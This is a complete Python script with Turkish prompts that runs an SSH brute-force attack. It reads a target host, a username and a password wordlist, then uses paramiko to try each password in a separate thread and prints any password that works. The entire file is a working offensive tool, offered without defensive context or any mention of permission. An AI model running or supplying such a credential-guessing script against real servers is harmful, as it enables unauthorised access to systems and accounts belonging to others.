#!/usr/bin/python3

import sys, os, paramiko
import time,threading

durdur = 0
def ssh_connect(password):
    global durdur

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=kullanici, password=password)
        durdur = 1
        print("[+] Parola Bulundu : '" + password + "'  SSH Kullanicisi : " + kullanici)
    except:
        pass
    ssh.close()


host = input("Hedef Host adresini giriniz: ")
kullanici = input("Kullanici ismini giriniz: ")
parola_list = input("parola listesini giriniz: ")

if os.path.exists(parola_list) == False:
    print("Wordlist bulunamadi !!!!")
    sys.exit(1)

print("\n*** SSH Kaba Kuvvet Saldirisi Baslamistir ***\n")

with open(parola_list, "r") as f:
    for line in f.readlines():
        if durdur == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
        
        
